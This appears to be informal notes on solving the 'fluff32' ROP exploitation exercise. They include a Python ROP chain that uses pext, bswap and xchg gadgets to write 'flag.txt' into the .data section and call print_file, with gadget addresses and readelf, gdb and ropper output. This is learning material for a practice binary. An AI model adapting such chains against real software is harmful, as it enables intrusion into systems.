Differences from template to 32
# Use find_mask.py... It is a very next level script
full_mask = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0x1db, 0xacd, 0x1ac5, 0xacd]
# Holds the exploit
fluff_exploit = b""
```
for data_section_offset, mask in enumerate(full_mask):
    # Pops mask byte into ebp
    fluff_exploit += pack(pop_ebp)
    fluff_exploit += pack(mask)
    # Does pext and places output into edx (dl)
    fluff_exploit += pack(pext_edx)
    # Pops data section address offset to ecx (does bswap to switch endianness)
    fluff_exploit += pack(bswap_ecx)
    fluff_exploit += pack(data_section_address + data_section_offset, endian='big')
    # Exchanges the byte in edx (dl) with the byte pointed to ecx (Dataset offset)
    fluff_exploit += pack(xchg_ecx_dl)
```
# Build the payload
payload = flat({
    offset: [ fluff_exploit,    #Writes the next level exploit
    print_file,                 #Print file call
    0x0,                        #Null to make it happy
    data_section_address        #Location of flag.txt
    ]
})

# Where to start?
```
    Find a location to write
        readelf -S badchars32
    Find the gadgets to write into something
        gdb fluff32
        disas questionableGadgets
            0x08048555 <+18>:    xchg   %dl,(%ecx)
    Find something that pops edx into ecx
        ropper -f fluff32 --search pop
            0x08048558: pop ecx; bswap ecx; ret; 
    Find something that writes into edx
        ropper -f fluff32 --search mov
            0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; 
            wtf does this mean???
                You control ebp. Your values are compared against b0bababa. deadbeef is not used
    Find something that writes into ebp
        ropper -f fluff32 --search pop
            0x080485bb: pop ebp; ret; 
    Find mask values to insert into ebp to make it output flag.txt
        python3 pext_find_mask.py
    bswap ecx (write location + offset in Big endian)
        pack(data_section_address + data_section_offset, endian='big')
    Loop through all mask characters (flag.txt)
        for data_section_offset, mask in enumerate(full_mask):
```

# Attack Order
```
    pop_ebp
    mask
    pext_edx
    bswap_ecx
    data_section_address + data_section_offset, endian='big'
    xchg_ecx_dl

    fluff_exploit
    print_file
    0x0
    data_section_address
```

# How do you know what to do???
```
    data_section_address = 0x0804a018
        readelf -S badchars32
            [Nr] Name              Type             Address           Offset        Size              EntSize          Flags  Link  Info  Align
            [24] .data             PROGBITS         0804a018          001018        000008            00               WA     0     0     4

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**
    
    xchg_ecx_dl = 0x08048555
        gdb fluff32
        disas questionableGadgets
            0x08048555 <+18>:    xchg   %dl,(%ecx)
            I now need something that pops edx into ecx
    
    bswap_ecx = 0x08048558
        ropper -f fluff32 --search pop
            0x08048558: pop ecx; bswap ecx; ret; 

    pext_edx = 0x08048543
        ropper -f fluff32 --search mov
            0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; 
            wtf does this mean???
                You control ebp. Your values are compared against b0bababa. deadbeef is not used

    pop_ebp = 0x080485bb 
        ropper -f fluff32 --search pop
            0x080485bb: pop ebp; ret; 

    print_file = 0x08048538
        gdb fluff32
        disas usefulFunctions
            0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
```
   
# Manual Exploitation
LOL
